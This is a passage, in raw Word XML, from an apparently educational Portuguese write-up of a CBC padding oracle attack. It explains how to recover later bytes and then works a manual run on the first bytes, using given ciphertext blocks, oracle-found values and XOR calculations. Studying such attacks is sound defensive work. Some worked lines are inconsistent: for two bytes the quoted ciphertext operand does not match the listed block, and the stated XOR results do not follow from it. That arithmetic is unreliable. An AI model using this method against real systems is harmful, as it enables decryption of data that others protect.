        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Logo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[15] = CC1[15] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x01</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3014D48F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="240" w:name="descobrirosbytessubsequentes"/>
      <w:bookmarkEnd w:id="240"/>
      <w:r>
        <w:t>Descobrir os Bytes Subsequentes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2B3CE1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Para o penúltimo byte, preciso de padding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x02 0x02</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CB4FCA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Primeiro, ajusto </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CC1[15]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> para que produza </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>0x02</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">CC1[15] = D2[15] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x02</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC0E03C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Depois testo valores para </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>CC1[14]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> até obter padding válido </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B672E32" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Quando válido: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[14] = CC1[14] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x02</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20640A2F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Este processo repete-se para todos os 16 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E774A2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="241" w:name="execuomanualprimeiros6bytes"/>
      <w:bookmarkStart w:id="242" w:name="_Toc213874757"/>
      <w:bookmarkStart w:id="243" w:name="_Toc213881995"/>
      <w:bookmarkEnd w:id="241"/>
      <w:r>
        <w:t>Execução Manual (Primeiros 6 Bytes)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="242"/>
      <w:bookmarkEnd w:id="243"/>
    </w:p>
    <w:p w14:paraId="2272303D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Dados obtidos do oráculo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B14F48" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C1 = a9b2554b0944118061212098f2f238cd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A3B3CB2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>C2 = 779ea0aae3d9d020f3677bfcb3cda9ce</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9453B4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Byte 16 (último byte)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5BEE78" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Valor encontrado: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[15] = 0xcf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D82F6A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cálculo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[15] = 0x01 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0xcf = 0xce</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9FA35D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Plaintext: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">P2[15] = 0xcd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0xce = 0x03</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164B06EC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
        </w:rPr>
        <w:t>Byte 15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575540EF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ajuste do byte 16: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">CC1[15] = 0xce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x02 = 0xcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA8E950" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Valor encontrado: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[14] = 0x39</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770B8FC1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cálculo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[14] = 0x02 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x39 = 0x3b</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1196DC52" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Plaintext: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">P2[14] = 0xf2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x3b = 0x03</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638EFD58" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
        </w:rPr>
        <w:t>Byte 14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9A04B6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ajustes: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[15] = 0xcd</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[14] = 0x38</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B3C1F6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Valor encontrado: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[13] = 0xf2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5524E058" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cálculo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[13] = 0x03 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0xf2 = 0xf1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BF71FB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Plaintext: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">P2[13] = 0xf2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0xf1 = 0x03</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05844DC7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
        </w:rPr>
        <w:t>Byte 13</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA8897C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Valor encontrado: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[12] = 0x18</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FAF41BD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cálculo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[12] = 0x04 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x18 = 0x1c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4179C933" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Plaintext: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">P2[12] = 0x98 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x1c = 0xee</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782885B0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Forte"/>
        </w:rPr>
        <w:t>Byte 12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459D9AD0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Valor encontrado: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>CC1[11] = 0x40</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A48EA5D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="0" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cálculo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">D2[11] = 0x05 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⊕</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x40 = 0x45</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A53D297" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Corpodetexto"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="0"/>
        </w:tabs>
        <w:spacing w:before="0" w:after="140" w:line="276" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Plaintext: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">P2[11] = 0x20 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
